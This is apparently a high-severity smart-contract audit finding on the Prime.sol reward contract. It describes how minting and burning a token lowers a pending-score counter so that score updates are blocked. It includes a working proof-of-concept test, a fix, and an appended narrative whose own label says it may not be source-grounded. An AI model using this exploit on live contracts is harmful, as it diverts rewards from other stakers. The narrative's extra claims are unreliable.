---
id: 19328
severity: "High"
---

# A malicious user can avoid unfavorable score updates after alpha/multiplier changes, resulting in accrual of outsized rewards for the attacker at the expense of other users

## Description

Please note: All functions/properties referred to are in the `Prime.sol` contract.

## Proof of Concept

An attacker can prevent their score from being updated and decreased after the protocol’s alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users’ scores first and/or DoSing calls to `updateScores()` that would update the attacker’s score (see the issue titled “DoS and gas griefing of Prime.updateScores()”).

The core of this vulnerability is the attacker’s ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user’s Prime token, doesn’t change the value of `pendingScoreUpdates`:
```solidity
    function claim() external { 
        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();
        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();

        stakedAt[msg.sender] = 0;

        _mint(false, msg.sender);
        _initializeMarkets(msg.sender);
    }
    function _mint(bool isIrrevocable, address user) internal {
        if (tokens[user].exists) revert IneligibleToClaim();

        tokens[user].exists = true;
        tokens[user].isIrrevocable = isIrrevocable;

        if (isIrrevocable) {
            totalIrrevocable++;
        } else {
            totalRevocable++;
        }

        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();

        emit Mint(user, isIrrevocable);
    }
    function _initializeMarkets(address account) internal {
        address[] storage _allMarkets = allMarkets;
        for (uint256 i = 0; i < _allMarkets.length; ) {
            address market = _allMarkets[i];
            accrueInterest(market);

            interests[market][account].rewardIndex = markets[market].rewardIndex;
            uint256 score = _calculateScore(market, account);
            interests[market][account].score = score;
            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;

            unchecked {
                i++;
            }
        }
    }
```
However, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:
```solidity
    function _burn(address user) internal {
        ...
        _updateRoundAfterTokenBurned(user);

        emit Burn(user);
    }
    function _updateRoundAfterTokenBurned(address user) internal { 
        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;

        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {
            pendingScoreUpdates--;
        }
    }
```
To inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`.

As aforementioned, the attacker can ensure that only other users’ scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.

Relevant code from `updateScores()` for reference:
```solidity
    function updateScores(address[] memory users) external {
        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); 
        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();

        for (uint256 i = 0; i < users.length; ) {
            ...
            pendingScoreUpdates--;
            isScoreUpdated[nextScoreUpdateRoundId][user] = true;

            unchecked {
                i++;
            }

            emit UserScoreUpdated(user);
        }
    }
```
As seen, the attacker’s score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker’s score. Because rewards are distributed according to the user’s score divided by the total score, the attacker can ‘freeze’ their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.

The attacker can also prevent score updates for other users. The attacker can ‘freeze’ a user’s score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.

Paste and run the below test in the ‘mint and burn’ scenario in Prime.ts (line 302)
```solidity
    it("prevent_Update", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`
      //setup 3 users
      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);
      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));
      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));
      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));
      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));
      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));
      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));
      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates
      const [,,,,user4,user5] = await ethers.getSigners();
      await xvs.transfer(user4.address, bigNumber18.mul(1000000));
      await xvs.transfer(user5.address, bigNumber18.mul(1000000));
      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));
      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));
      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));
      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));
      await mine(90 * 24 * 60 * 60);
      //change alpha, pendingScoreUpdates changed to 3
      await prime.updateAlpha(1, 5);
      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2
      await prime.connect(user4).claim();
      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));
      await prime.connect(user5).claim();
      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));
      //attacker updates user 3, decreasing pendingScoreUpdates by 1
      await prime.connect(user1).updateScores([user3.getAddress()])
      //users 1 and 2 won't be updated because pendingScoreUpdates is 0
      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, "NoScoreUpdatesRequired");
    });
```

## Recommendation

Check if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker’s ability to manipulate `pendingScoreUpdates`.
```solidity
    function _mint(bool isIrrevocable, address user) internal {
        if (tokens[user].exists) revert IneligibleToClaim();

        tokens[user].exists = true;
        tokens[user].isIrrevocable = isIrrevocable;

        if (isIrrevocable) {
            totalIrrevocable++;
        } else {
            totalRevocable++;
        }

        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();
        if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} 

        emit Mint(user, isIrrevocable);
    }
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a logical accounting flaw in the Prime contract that allows a malicious participant to manipulate the internal counter that tracks pending score updates, called pendingScoreUpdates. The root cause is that the function that mints a new Prime token (called during claim) does not increment pendingScoreUpdates, while the burn routine decrements it under certain conditions. After a protocol parameter such as alpha or a reward multiplier is changed, the system expects pendingScoreUpdates to reflect the number of user scores that must be recomputed. By deliberately minting and then burning a token immediately after the parameter change, an attacker can cause pendingScoreUpdates to be reduced without the corresponding score update for their own address. The attacker can then invoke updateScores for other users until the counter reaches zero. When pendingScoreUpdates is zero, any further call to updateScores reverts with NoScoreUpdatesRequired, preventing the attacker’s score from being adjusted. Because rewards are allocated proportionally to each user’s score, the attacker can freeze a higher-than‑expected score while the protocol’s multiplier would otherwise lower it, resulting in outsized reward accrual at the expense of honest participants. This scenario occurs only when a user has satisfied the staking period, can claim a Prime token, and can subsequently burn it, typically after an alpha or multiplier update. The affected parties are token holders who rely on fair reward distribution and the protocol itself, which loses revenue integrity. The issue was uncovered during a Code4rena audit through targeted unit tests that demonstrated the counter manipulation and the resulting revert behavior. It is difficult to notice because pendingScoreUpdates is an internal bookkeeping variable that is not exposed in the UI, and the claim function appears to work correctly from a user perspective, masking the missing increment. From a user’s point of view the symptom is that after a parameter change the attacker continues to receive the same or higher rewards while other users see reduced payouts, and attempts to trigger a score update for the attacker fail silently with a revert. The bug belongs to the class of reward‑distribution accounting errors where state‑transition counters are incorrectly updated, leading to frozen or stale scores. To remediate the issue the contract should ensure that every token mint increments pendingScoreUpdates, that burns only decrement the counter when a pending update for that user actually exists, and that the updateScores logic validates that the counter accurately reflects outstanding updates before allowing a revert. In short, proper synchronization of the pendingScoreUpdates counter with token lifecycle events will close the loophole and restore correct reward calculations.
